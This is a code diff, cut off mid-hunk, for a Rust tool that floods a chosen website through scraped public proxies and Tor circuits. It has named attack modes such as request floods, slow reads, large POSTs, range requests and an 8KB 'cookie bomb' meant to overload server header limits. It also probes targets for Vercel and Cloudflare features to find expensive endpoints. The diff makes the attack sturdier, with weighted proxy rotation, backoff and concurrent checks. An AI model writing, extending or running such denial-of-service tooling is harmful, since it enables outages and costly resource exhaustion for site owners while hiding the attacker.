@@ -1,7 +1,7 @@
 use std::collections::HashMap;
 use std::sync::Arc;
 use std::time::{Duration, Instant};
-use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, Ordering};
 use rand::prelude::*;
 use rand::distr::{Distribution, weighted::WeightedIndex};
 use regex::Regex;
@@ -158,29 +158,81 @@ impl std::fmt::Display for AttackMode {
 }
 
 #[allow(dead_code)]
-struct ProxyPool { clients: Vec<Client>, labels: Vec<String>, current: usize, cooldown_until: Vec<Instant>, failure_tier: Vec<u32>, succeeded: Vec<bool>, is_tor: Vec<bool>, weights: Vec<f64> }
+struct ProxyPool {
+    clients: Vec<Client>,
+    labels: Vec<String>,
+    current: usize,
+    cooldown_until: Vec<Instant>,
+    failure_tier: Vec<u32>,
+    succeeded: Vec<bool>,
+    is_tor: Vec<bool>,
+    weights: Vec<f64>,
+}
+
 impl ProxyPool {
     fn new(proxies: &[String]) -> Self {
-        let mut clients = Vec::with_capacity(proxies.len()); let mut labels = Vec::with_capacity(proxies.len()); let mut is_tor = Vec::with_capacity(proxies.len());
+        let mut clients = Vec::with_capacity(proxies.len());
+        let mut labels = Vec::with_capacity(proxies.len());
+        let mut is_tor = Vec::with_capacity(proxies.len());
         let mut weights = Vec::with_capacity(proxies.len());
         for u in proxies {
             let url = if u.contains("://") { u.clone() } else { format!("http://{}", u) };
             if let Ok(p) = reqwest::Proxy::all(&url) {
                 if let Ok(c) = browser_client_builder().proxy(p).build() {
-                    clients.push(c); labels.push(url.clone()); is_tor.push(url.contains(":isolate@")); weights.push(1.0);
+                    clients.push(c);
+                    labels.push(url.clone());
+                    is_tor.push(url.contains(":isolate@"));
+                    weights.push(1.0);
                 }
             }
         }
-        let n = clients.len(); ProxyPool { clients, labels, current: 0, cooldown_until: vec![Instant::now(); n], failure_tier: vec![0; n], succeeded: vec![false; n], is_tor, weights }
+        let n = clients.len();
+        ProxyPool {
+            clients,
+            labels,
+            current: 0,
+            cooldown_until: vec![Instant::now(); n],
+            failure_tier: vec![0; n],
+            succeeded: vec![false; n],
+            is_tor,
+            weights,
+        }
     }
+
     fn next(&mut self) -> Option<(usize, Client)> {
         let now = Instant::now();
-        let weights_vec: Vec<f64> = self.weights.iter().map(|&w| w as f64).collect();
-        if weights_vec.is_empty() { return None; }
-        let dist = WeightedIndex::new(&weights_vec).ok()?;
-        let idx = dist.sample(&mut rand::rng());
-        if self.cooldown_until[idx] <= now { return Some((idx, self.clients[idx].clone())); }
-        None
+        let mut active_indices = Vec::new();
+        let mut active_weights = Vec::new();
+        for i in 0..self.clients.len() {
+            if self.cooldown_until[i] <= now {
+                active_indices.push(i);
+                active_weights.push(self.weights[i]);
+            }
+        }
+        if active_indices.is_empty() {
+            return None;
+        }
+        let dist = WeightedIndex::new(&active_weights).ok()?;
+        let sample_idx = dist.sample(&mut rand::rng());
+        let idx = active_indices[sample_idx];
+        Some((idx, self.clients[idx].clone()))
+    }
+
+    fn report_success(&mut self, idx: usize) {
+        if idx < self.clients.len() {
+            self.succeeded[idx] = true;
+            self.failure_tier[idx] = 0;
+            self.weights[idx] = (self.weights[idx] + 0.1).min(1.0);
+        }
+    }
+
+    fn report_failure(&mut self, idx: usize) {
+        if idx < self.clients.len() {
+            self.failure_tier[idx] += 1;
+            let secs = 2u64.pow(self.failure_tier[idx].min(8)).min(300);
+            self.cooldown_until[idx] = Instant::now() + Duration::from_secs(secs);
+            self.weights[idx] = (self.weights[idx] * 0.5).max(0.01);
+        }
     }
 }
 
@@ -205,18 +257,33 @@ const RAW_SRC: &[&str] = &[
     "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt","https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
 ];
 
+fn detect_scheme(url: &str) -> &'static str {
+    let url_lower = url.to_lowercase();
+    if url_lower.contains("socks5") {
+        "socks5"
+    } else if url_lower.contains("socks4") {
+        "socks4"
+    } else if url_lower.contains("socks") {
+        "socks5"
+    } else {
+        "http"
+    }
+}
+
 async fn scrape_html(c: &Client, url: &str) -> Vec<String> {
+    let scheme = detect_scheme(url);
     let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
     let h = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
     let doc = Html::parse_document(&h); let tr = Selector::parse("table.table tbody tr").unwrap(); let td = Selector::parse("td").unwrap(); let mut out = vec![];
     for row in doc.select(&tr) { let cells: Vec<String> = row.select(&td).map(|c| c.text().collect::<String>().trim().to_string()).collect();
-        if cells.len() >= 2 { let ip = cells[0].trim().to_string(); let port = cells[1].trim().to_string(); if !ip.is_empty() && !port.is_empty() { out.push(format!("{}:{}", ip, port)); } } } out
+        if cells.len() >= 2 { let ip = cells[0].trim().to_string(); let port = cells[1].trim().to_string(); if !ip.is_empty() && !port.is_empty() { out.push(format!("{}://{}:{}", scheme, ip, port)); } } } out
 }
 
 async fn scrape_raw(c: &Client, url: &str, re: &Regex) -> Vec<String> {
+    let scheme = detect_scheme(url);
     let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
     let t = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
-    t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())) }).collect()
+    t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())).map(|ip_port| format!("{}://{}", scheme, ip_port)) }).collect()
 }
 
 async fn scrape_all(c: &Client, state: &Arc<Mutex<AppState>>) -> Vec<String> {
@@ -292,19 +359,38 @@ async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_id: St
 
 async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
-    let cookie = format!("_ga={}; _gid={}; _fbp={}; session={}; token={}; uuid={}; visitor={}; ref={}; campaign={}; source={}; medium={}; term={}; content={}; platform={}; device={}; region={}",
-        rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(),
-        rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>());
+    // Standard cookie bomb uses very large cookies (~8KB) to overload server header limits
+    let bomb_payload = "x".repeat(8192);
+    let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
+        rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
     let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
     let resp = add_session_and_extra_cookie(builder, &proxy_id, &sessions, &cookie).await.send().await?;
     update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
     Ok(resp.bytes().await?.len())
 }
 
+#[derive(Clone)]
+struct Stats {
+    running: Arc<AtomicBool>,
+    total_requests: Arc<AtomicU64>,
+    total_bytes: Arc<AtomicU64>,
+    errors: Arc<AtomicU64>,
+}
+
+impl Stats {
+    fn new() -> Self {
+        Stats {
+            running: Arc::new(AtomicBool::new(false)),
+            total_requests: Arc::new(AtomicU64::new(0)),
+            total_bytes: Arc::new(AtomicU64::new(0)),
+            errors: Arc::new(AtomicU64::new(0)),
+        }
+    }
+}
+
 #[allow(dead_code)]
 struct AppState {
-    mode: ProxyMode, running: bool, iteration: u64, total_requests: u64, total_bytes: u64, errors: u64,
-    proxy_count: usize, working_count: usize, active_count: usize, last_bytes: u64,
+    mode: ProxyMode, stats: Stats, iteration: u64,
     status_msg: String, proxy_status: Vec<(String, String)>,
     total_alive: usize, total_working: usize, total_scraped: usize,
     scrape_phase: u32, scrape_total: u32, tcp_checked: u32, tcp_total: u32,
@@ -321,8 +407,7 @@ struct AppState {
 
 impl AppState {
     fn new() -> Self { AppState {
-        mode: ProxyMode::Scrape, running: false, iteration: 0, total_requests: 0, total_bytes: 0, errors: 0,
-        proxy_count: 0, working_count: 0, active_count: 0, last_bytes: 0,
+        mode: ProxyMode::Scrape, stats: Stats::new(), iteration: 0,
         status_msg: "Ready".to_string(), proxy_status: vec![],
         total_alive: 0, total_working: 0, total_scraped: 0,
         scrape_phase: 0, scrape_total: 0, tcp_checked: 0, tcp_total: 0,
@@ -351,7 +436,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     let c = browser_client_builder().timeout(Duration::from_secs(5)).build().unwrap();
     let base = target_url.trim_end_matches('/');
     let mut vercel = false; let mut plan = String::new(); let mut middleware = false;
-    let imgs: Vec<String> = vec![]; let mut apis: Vec<String> = vec![]; let mut statics: Vec<String> = vec![]; let mut imgopt = false;
+    let mut imgs: Vec<String> = vec![]; let mut apis: Vec<String> = vec![]; let mut statics: Vec<String> = vec![]; let mut imgopt = false;
     let mut isr = false; let mut cache_bypass = false; let mut edge_config = false; let mut html = String::new();
 
     if let Ok(r) = browser_request(c.get(base)).send().await {
@@ -359,8 +444,14 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
         vercel = hdrs.get("server").and_then(|v| v.to_str().ok()).map(|s| s.contains("Vercel")).unwrap_or(false);
         if let Some(id) = hdrs.get("x-vercel-id").and_then(|v| v.to_str().ok()) { plan = format!("Vercel ({})", id.split("::").next().unwrap_or("")); }
         if hdrs.get("server").and_then(|v| v.to_str().ok()).map(|s| s.contains("cloudflare")).unwrap_or(false) { plan = "Cloudflare".to_string(); }
-        middleware = hdrs.get("x-middleware-*").is_some() || hdrs.get("x-middleware-next").is_some() || hdrs.get("x-middleware-request").is_some();
-        edge_config = hdrs.get("x-vercel-edge-config-*").is_some() || hdrs.get("x-edge-config-").is_some();
+        middleware = hdrs.keys().any(|k| {
+            let ks = k.as_str().to_lowercase();
+            ks.starts_with("x-middleware-") || ks == "x-middleware-next" || ks == "x-middleware-request"
+        });
+        edge_config = hdrs.keys().any(|k| {
+            let ks = k.as_str().to_lowercase();
+            ks.starts_with("x-vercel-edge-config-") || ks.starts_with("x-edge-config-")
+        });
         if let Some(cache) = hdrs.get("x-vercel-cache").and_then(|v| v.to_str().ok()) { isr = cache == "REVALIDATED"; }
         if hdrs.get("x-nextjs-cache").is_some() { isr = true; }
         if let Ok(body) = r.text().await { html = body; }
@@ -390,28 +481,77 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     }
     for path in & ["/favicon.ico", "/favicon.svg", "/favicon.png"] { let f = format!("{}{}", base, path); if !statics.contains(&f) { statics.push(f); } }
     statics.sort(); statics.dedup();
+
+    // Concurrently verify statics
     let mut verified_statics: Vec<String> = vec![];
-    for path in &statics {
-        if let Ok(r) = browser_request(c.get(path)).send().await {
-            if r.status().as_u16() < 400 {
-                let sz = r.bytes().await.map(|b| b.len()).unwrap_or(0);
-                if sz > 0 {
-                    verified_statics.push(path.clone());
-                    let lower = path.to_lowercase();
-                    if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
-                        if vercel {
-                            if let Ok(r2) = browser_request(c.get(&format!("{}?width=300", path))).send().await {
-                                let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
-                                if sz2 > 0 && sz2 != sz { imgopt = true; }
+    let sem = Arc::new(Semaphore::new(10));
+    let mut join_handles = vec![];
+    for path in statics {
+        let sem_clone = sem.clone();
+        let c_clone = c.clone();
+        let path_clone = path.clone();
+        let vercel_clone = vercel;
+        join_handles.push(tokio::spawn(async move {
+            let _permit = sem_clone.acquire().await.unwrap();
+            let mut is_img = false;
+            let mut is_img_opt = false;
+            let mut is_ok = false;
+            if let Ok(r) = browser_request(c_clone.get(&path_clone)).send().await {
+                if r.status().as_u16() < 400 {
+                    let sz = r.bytes().await.map(|b| b.len()).unwrap_or(0);
+                    if sz > 0 {
+                        is_ok = true;
+                        let lower = path_clone.to_lowercase();
+                        if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
+                            is_img = true;
+                            if vercel_clone {
+                                if let Ok(r2) = browser_request(c_clone.get(&format!("{}?width=300", path_clone))).send().await {
+                                    let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
+                                    if sz2 > 0 && sz2 != sz {
+                                        is_img_opt = true;
+                                    }
+                                }
                             }
                         }
                     }
                 }
             }
+            (path_clone, is_ok, is_img, is_img_opt)
+        }));
+    }
+    for h in join_handles {
+        if let Ok((path, is_ok, is_img, is_img_opt)) = h.await {
+            if is_ok {
+                verified_statics.push(path.clone());
+                if is_img {
+                    imgs.push(path);
+                    if is_img_opt {
+                        imgopt = true;
+                    }
+                }
+            }
         }
     }
-    for path in & ["/api/chat", "/api/health", "/api/status", "/api/products", "/api/generate"] {
-        if let Ok(r) = browser_request(c.get(&format!("{}{}", base, path))).send().await { if r.status().as_u16() < 400 { apis.push(path.to_string()); } }
+
+    // Concurrently verify APIs
+    let api_paths = ["/api/chat", "/api/health", "/api/status", "/api/products", "/api/generate"];
+    let mut api_handles = vec![];
+    for path in api_paths {
+        let c_clone = c.clone();
+        let url = format!("{}{}", base, path);
+        api_handles.push(tokio::spawn(async move {
+            if let Ok(r) = browser_request(c_clone.get(&url)).send().await {
+                if r.status().as_u16() < 400 {
+                    return Some(path.to_string());
+                }
+            }
+            None
+        }));
+    }
+    for h in api_handles {
+        if let Ok(Some(path)) = h.await {
+            apis.push(path);
+        }
     }
     
     let mut status = String::new();
@@ -430,6 +570,41 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     st.probe_status = status; st.is_vercel = vercel; st.vercel_plan = plan; st.has_image_opt = imgopt; st.has_api = !apis.is_empty(); st.has_middleware = middleware;
     st.has_isr = isr; st.has_cache_bypass = cache_bypass; st.has_edge_config = edge_config; st.has_log_drains = vercel; st.has_storage = false;
     st.imgs = imgs; st.apis = apis; st.statics = verified_statics;
+}
+
+async fn filter_alive_proxies(proxies: &[String], state: &Arc<Mutex<AppState>>) -> Vec<String> {
+    let to = 1u64;
+    let tc = 1000usize;
+    let total = proxies.len();
+    state.lock().await.tcp_total = total as u32;
+    state.lock().await.status_msg = format!("TCP check {}...", total);
+    let sem = Arc::new(Semaphore::new(tc));
+    let a = Arc::new(Mutex::new(Vec::new()));
+    let d = Arc::new(AtomicUsize::new(0));
+    let s2 = Arc::clone(state);
+    let mut h = Vec::with_capacity(total);
+    for p in proxies.to_owned() {
+        let permit = Arc::clone(&sem).acquire_owned().await.unwrap();
+        let aa = Arc::clone(&a);
+        let dd = Arc::clone(&d);
+        let ss = Arc::clone(&s2);
+        h.push(tokio::spawn(async move {
+            if tcp_check(&p, to).await {
+                aa.lock().await.push(p);
+            }
+            let n = dd.fetch_add(1, Ordering::Relaxed) + 1;
+            if n % 500 == 0 || n == total {
+                ss.lock().await.tcp_checked = n as u32;
+                ss.lock().await.status_msg = format!("TCP: {}/{}", n, total);
+            }
+            drop(permit);
+        }));
+    }
+    for x in h {
+        let _ = x.await;
+    }
+    let alive_result = a.lock().await.clone();
+    alive_result
 }
 
 async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Vec<String>> {
@@ -459,7 +634,14 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
         ProxyMode::Scrape | ProxyMode::ScrapeTorFallback => {
             state.lock().await.status_msg = "Scraping proxies...".to_string();
             let c = browser_client_builder().timeout(Duration::from_secs(15)).build().unwrap();
-            let scraped = scrape_all(&c, state).await;
+            let scraped = match tokio::time::timeout(Duration::from_secs(30), scrape_all(&c, state)).await {
+                Ok(res) => res,
+                Err(_) => {
+                    let mut st = state.lock().await;
+                    st.status_msg = "Proxy scraping timed out".to_string();
+                    vec![]
+                }
+            };
             if scraped.is_empty() {
                 if mode == ProxyMode::ScrapeTorFallback { /* fall through to Tor */ }
                 else { state.lock().await.status_msg = "No proxies scraped".to_string(); return None; }
@@ -467,15 +649,7 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
             state.lock().await.status_msg = format!("{} proxies scraped", scraped.len());
             state.lock().await.total_scraped = scraped.len();
             let sample: Vec<String> = scraped.into_iter().take(2000).collect();
-            let alive = { let to = 1u64; let tc = 1000usize; let total = sample.len();
-                state.lock().await.tcp_total = total as u32; state.lock().await.status_msg = format!("TCP check {}...", total);
-                let sem = Arc::new(Semaphore::new(tc)); let a = Arc::new(Mutex::new(Vec::new())); let d = Arc::new(AtomicUsize::new(0)); let s2 = Arc::clone(state); let mut h = Vec::with_capacity(total);
-                for p in sample { let permit = Arc::clone(&sem).acquire_owned().await.unwrap(); let aa = Arc::clone(&a); let dd = Arc::clone(&d); let ss = Arc::clone(&s2);
-                    h.push(tokio::spawn(async move { if tcp_check(&p, to).await { aa.lock().await.push(p); } let n = dd.fetch_add(1, Ordering::Relaxed) + 1;
-                        if n % 500 == 0 || n == total { ss.lock().await.tcp_checked = n as u32; ss.lock().await.status_msg = format!("TCP: {}/{}", n, total); } drop(permit); }));
-                }
-                for x in h { let _ = x.await; }
-                let alive_result = a.lock().await.clone(); alive_result };
+            let alive = filter_alive_proxies(&sample, state).await;
             state.lock().await.total_alive = alive.len(); state.lock().await.status_msg = format!("TCP alive: {}", alive.len());
             let mut result = alive;
             result.sort(); result.dedup();
@@ -493,17 +667,20 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
     }
 }
 
-async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<Mutex<ProxyPool>>, delay_ms: u64, max_errors: Option<u64>) {
-    let (conc, interval, attack) = { let st = state.lock().await; (st.load_concurrency, st.interval_ms, st.attack_mode) };
+async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyPool>>, stats: Stats, delay_ms: u64, max_errors: Option<u64>) {
+    let (conc, interval, attack, sessions) = {
+        let st = state.lock().await;
+        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone())
+    };
     let delay = if delay_ms > 0 { delay_ms } else { interval };
     let semaphore = Arc::new(Semaphore::new(conc));
 
     loop {
-        if max_errors.is_some() && state.lock().await.errors >= max_errors.unwrap() {
+        if max_errors.is_some() && stats.errors.load(Ordering::Relaxed) >= max_errors.unwrap() {
             println!("  Max errors ({}) reached, stopping.", max_errors.unwrap());
             break;
         }
-        if !state.lock().await.running { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
+        if !stats.running.load(Ordering::Relaxed) { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
         let target_url = state.lock().await.target_url.clone();
         if target_url.is_empty() { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
         let _ = Url::parse(&target_url).ok();
@@ -520,73 +697,78 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<Mutex<ProxyPool>>, dela
         };
 
         loop {
-            if !state.lock().await.running { break; }
+            if !stats.running.load(Ordering::Relaxed) { break; }
             let _permit = semaphore.clone().acquire_owned().await.unwrap();
-            let mut p_lock = pool.lock().await;
-            if let Some((idx, client)) = p_lock.next() {
-                drop(p_lock);
-                let s = state.clone();
+            let next_client = {
+                let mut p_lock = pool.lock().unwrap();
+                p_lock.next()
+            };
+            if let Some((idx, client)) = next_client {
+                let stats_clone = stats.clone();
                 let proxy_id = format!("p{}", idx);
                 let assets = assets.clone();
                 let attack = attack;
                 let target = target_url.clone();
-                let sessions = s.lock().await.sessions.clone();
+                let sessions_clone = sessions.clone();
                 let idx1 = rand::rng().random_range(0..assets.len());
+                let pool_clone = pool.clone();
                 let _ = tokio::spawn(async move {
                     let result = match attack {
                         AttackMode::Bandwidth | AttackMode::Normal => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                         }
                         AttackMode::SlowRead => {
-                            fetch_slow(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_slow(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                         }
                         AttackMode::ImageOpt => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                         }
                         AttackMode::LargePost => {
-                            fetch_post(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_post(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                         }
                         AttackMode::AssetSpray => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                         }
                         AttackMode::RangeReq => {
-                            if assets.is_empty() { fetch_range(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_range(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                         }
                         AttackMode::CookieBomb => {
-                            fetch_cookie(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_cookie(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                         }
                         AttackMode::SSR => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                         }
                         AttackMode::Middleware => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
                         }
                         AttackMode::RequestFlood => {
-                            fetch_page(client, target.clone(), 0, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_page(client, target.clone(), 0, 0, proxy_id.clone(), sessions_clone.clone()).await
                         }
                         AttackMode::NotFound => {
                             let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
-                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), delay, 0, proxy_id.clone(), sessions.clone()).await
+                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
                         }
                     };
-                    if let Ok(bytes) = result {
-                        let mut st = s.lock().await;
-                        st.total_requests += 1;
-                        st.total_bytes += bytes as u64;
-                        st.last_bytes = bytes as u64;
-                    } else {
-                        s.lock().await.errors += 1;
+                    match result {
+                        Ok(bytes) => {
+                            stats_clone.total_requests.fetch_add(1, Ordering::Relaxed);
+                            stats_clone.total_bytes.fetch_add(bytes as u64, Ordering::Relaxed);
+                            pool_clone.lock().unwrap().report_success(idx);
+                        }
+                        Err(_) => {
+                            stats_clone.errors.fetch_add(1, Ordering::Relaxed);
+                            pool_clone.lock().unwrap().report_failure(idx);
+                        }
                     }
                 });
                 break;
             } else {
-                drop(p_lock);
                 tokio::time::sleep(Duration::from_millis(100)).await;
             }
         }
@@ -614,10 +796,6 @@ fn write_results_csv(path: &str, target: &str, status: &str, proxies: &[String],
 #[tokio::main]
 async fn main() {
     let args: Vec<String> = std::env::args().collect();
-    if args.len() > 1 && (args[1] == "-h" || args[1] == "--help") {
-        print_help();
-        return;
-    }
     // Parse flags
     let mut tor_only = false;
     let mut dry_run = false;
@@ -630,19 +808,50 @@ async fn main() {
     let mut tor_proxy: Option<String> = None;
     let mut delay_ms: u64 = 0;
     let mut max_errors: Option<u64> = None;
-    let mut positional: Vec<&str> = Vec::new();
-    for arg in args.iter().skip(1) {
+    let mut positional: Vec<String> = Vec::new();
+
+    let mut args_iter = args.into_iter().skip(1);
+    while let Some(arg) = args_iter.next() {
         match arg.as_str() {
-            "--version" => version = true,
+            "-h" | "--help" => {
+                print_help();
+                return;
+            }
+            "-v" | "--version" => version = true,
             "--list-modes" => list_modes = true,
             "--tor-only" => tor_only = true,
             "--verify" => verify = true,
             "--dry-run" => dry_run = true,
-            "--output" => {},
-            "--proxy-file" => {},
-            "--tor-proxy" => {},
-            "--delay" => {},
-            "--max-errors" => {},
+            "--output" => {
+                if let Some(val) = args_iter.next() {
+                    output_csv = Some(val);
+                }
+            }
+            "--proxy-file" => {
+                if let Some(val) = args_iter.next() {
+                    proxy_file = Some(val);
+                }
+            }
+            "--tor-proxy" => {
+                if let Some(val) = args_iter.next() {
+                    tor_proxy = Some(val);
+                }
+            }
+            "--delay" => {
+                if let Some(val) = args_iter.next() {
+                    delay_ms = val.parse().unwrap_or(0);
+                }
+            }
+            "--max-errors" => {
+                if let Some(val) = args_iter.next() {
+                    max_errors = val.parse().ok();
+                }
+            }
+            "--save-proxies" => {
+                if let Some(val) = args_iter.next() {
+                    save_proxies = Some(val);
+                }
+            }
             other => {
                 if other.starts_with("--output=") {
                     output_csv = Some(other.strip_prefix("--output=").unwrap().to_string());
@@ -656,15 +865,19 @@ async fn main() {
                     max_errors = other.strip_prefix("--max-errors=").unwrap().parse().ok();
                 } else if other.starts_with("--save-proxies=") {
                     save_proxies = Some(other.strip_prefix("--save-proxies=").unwrap().to_string());
+                } else if other.starts_with('-') {
+                    eprintln!("Unknown option: {}", other);
+                    std::process::exit(1);
                 } else {
-                    positional.push(other);
+                    positional.push(other.to_string());
                 }
             }
         }
     }
-    let target_url = positional.get(0).copied().unwrap_or(DEFAULT_TARGET_URL);
-    let mode_str = positional.get(1).copied().unwrap_or("scrape");
-    let attack_str = positional.get(2).copied().unwrap_or("normal");
+
+    let target_url = positional.get(0).cloned().unwrap_or_else(|| DEFAULT_TARGET_URL.to_string());
+    let mode_str = positional.get(1).map(|s| s.as_str()).unwrap_or("scrape");
+    let attack_str = positional.get(2).map(|s| s.as_str()).unwrap_or("normal");
     let concurrency: usize = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(20);
     let duration_secs: u64 = positional.get(4).and_then(|s| s.parse().ok()).unwrap_or(30);
 
@@ -719,7 +932,7 @@ async fn main() {
         }
 
         println!("[1/2] Probing domain...");
-        probe_domain(target_url, &state).await;
+        probe_domain(&target_url, &state).await;
         let status = {
             let st = state.lock().await;
             st.probe_status.clone()
@@ -734,21 +947,27 @@ async fn main() {
                 .split(|c: char| c.is_whitespace() || c == ',')
                 .filter_map(|s| { let s = s.trim(); if !s.is_empty() { Some(s.to_string()) } else { None }})
                 .collect();
-            if list.is_empty() { None } else { Some(list) }
+            if list.is_empty() {
+                None
+            } else {
+                println!("  Verifying {} proxies from file...", list.len());
+                let verified = filter_alive_proxies(&list, &state).await;
+                Some(verified)
+            }
         } else if let Some(url) = &tor_proxy {
             let n = concurrency.min(20);
             let mut p = Vec::with_capacity(n);
             for i in 0..n { p.push(format!("socks5://tor{}:isolate@{}", i, url.trim_start_matches("socks5://").trim_start_matches("http://"))); }
             Some(p)
         } else {
-            get_proxies(state.lock().await.mode, &state).await
+            let mode = { state.lock().await.mode };
+            get_proxies(mode, &state).await
         };
         match proxies {
             Some(prox_list) => {
                 println!("  Acquired {} proxies", prox_list.len());
                 if let Some(path) = &save_proxies {
-                    let content = prox_list.join("
-");
+                    let content = prox_list.join("\n");
                     std::fs::write(path, content).unwrap();
                     println!("  Saved {} proxies to {}", prox_list.len(), path);
                 }
@@ -815,7 +1034,7 @@ async fn main() {
     }
 
     println!("[1/3] Probing domain...");
-    probe_domain(target_url, &state).await;
+    probe_domain(&target_url, &state).await;
     let status = {
         let st = state.lock().await;
         st.probe_status.clone()
@@ -834,8 +1053,14 @@ async fn main() {
             eprintln!("  No proxies found in file {}", path);
             None
         } else {
-            println!("  Loaded {} proxies from file", list.len());
